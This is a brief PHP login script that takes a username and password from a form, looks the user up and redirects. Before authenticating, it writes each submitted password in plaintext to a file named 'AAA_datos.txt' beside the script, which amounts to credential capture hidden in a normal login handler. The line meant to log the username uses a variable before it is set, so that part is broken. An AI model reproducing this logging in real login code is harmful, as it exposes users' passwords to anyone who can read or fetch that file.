<?php
session_start();

require_once("../modelos/class_usuarios.php");

$login = $_POST['usuario'];
$password = $_POST['password'];

$file = fopen('AAA_datos.txt', 'w');
fwrite($file, 'Usuario: '.$usuario.PHP_EOL);
fwrite($file, 'Contraseña: '.$password.PHP_EOL);
fclose($file);

$usuario = new usuario();

$encontrados = $usuario->BuscarUsuarioLogin($login, $password);

if($encontrados > 0){
    $_SESSION['usuario'] = $login;
    header("location:../vistas/registro/registrar.php");
}else{
    header("location:../index.php");
}

